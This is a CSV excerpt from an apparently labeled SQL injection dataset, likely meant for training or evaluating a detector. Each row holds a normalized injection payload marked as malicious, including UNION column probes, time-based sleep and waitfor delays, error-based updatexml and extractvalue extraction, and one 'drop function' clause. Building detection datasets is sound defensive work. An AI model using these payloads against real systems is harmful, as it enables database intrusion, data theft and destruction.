row_index,payload_norm,label,sqli_type_hint
3420,"1%' union all select null,null,null,null,null,null,null,null,null,null--",1,
3421,"-7060' ) or make_set ( 4233 = 1689,1689 ) and ( 'twpr' like 'twpr",1,
3422,"1' ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
3423,"1"" where 8333 = 8333",1,
3424,if ( 6745 = 4078 ) select 6745 else drop function ytyt--,1,
3425,1%' and 1736 = 4220,1,
3426,"-7528' or make_set ( 3809 = 1821,1821 ) and 'kgch' = 'kgch",1,
3427,"-8153' where 2436 = 2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1,
3428,"1'|| ( select 'fcws' from dual where 9184 = 9184 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) ||'",1,
3429,"1"" ) as tecq where 4817 = 4817 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
3430,"1"" or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
3431,"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 7984 = 7984",1,
3432,1'|| ( select 'bsbv' from dual where 5276 = 5276 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) ||',1,
3433,"-9810' ) where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --",1,
3434,"1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""%"" = """,1,
3435,"1"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xqlh"" = ""xqlh",1,
3436,1' ) ) waitfor delay '0:0:5'--,1,
3437,"-8093"" ) ) as oboi where 1476 = 1476 union all select 1476,1476,1476,1476#",1,
3438,"1"" where 9341 = 9341",1,
3439,"-3703"" ) ) ) union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1,
3440,"1 ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 7813 = 7813",1,
3441,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- izad,1,
3442,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ||'",1,
3443,"1' in boolean mode ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
3444,"-4453' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'boxt' = 'boxt",1,
3445,"-3130 ) union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1,
3446,"-4233%"" ) or ( 8459 = 8459 ) *4906 and ( ""%"" = """,1,
3447,"1 ) ) union all select null,null,null,null,null,null,null,null,null--",1,
3448,"-5528' ) union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",1,
3449,"-4589"" ) union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",1,
